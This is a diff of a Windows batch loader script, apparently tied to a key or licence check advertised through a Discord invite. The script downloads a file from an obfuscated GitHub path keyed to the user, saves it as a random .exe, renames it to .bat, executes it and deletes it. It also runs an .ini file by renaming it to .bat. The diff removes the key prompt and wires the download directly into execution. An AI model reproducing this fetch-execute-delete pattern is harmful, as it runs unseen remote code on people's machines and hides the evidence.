@@ -24,31 +24,22 @@ goto error
 rename settings.ini settings.bat & call settings.bat & rename settings.bat settings.ini & set greenblack=[42;30m & set yellowblack=[43;30m & set yellowyellow=[43;33m & set whiteblack=[47;30m & set redblack=[43;31m
 set browser=""
 if %chrome%==true set browser=chrome
-:key
 cls
-echo %normal% 
-echo Get USER_KEY https://discord.gg/cMTwPzCgXV
-echo -
+echo %yellowyellow% 
 set keyurl=https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/users/%USER_KEY%
 set file=%random%%random%%random%
 cls 
 echo Loading...
 echo %yellowyellow%
 curl "%keyurl%" --output "%file%.exe" 
-if exist "%file%.exe" goto load
-goto key
+if exist "%file%.exe" goto key1
+goto error
 :key1
 rename %file%.exe %file%.bat
 call %file%.bat
 del %file%.bat
 if %username%==%pcname% goto menu
-cls
-color 4
-echo Detected!
-echo Not your key!
-timeout 20 > nul
-color 0f
-goto key
+goto error
 :menu
 cls
 mode con cols=20 lines=8
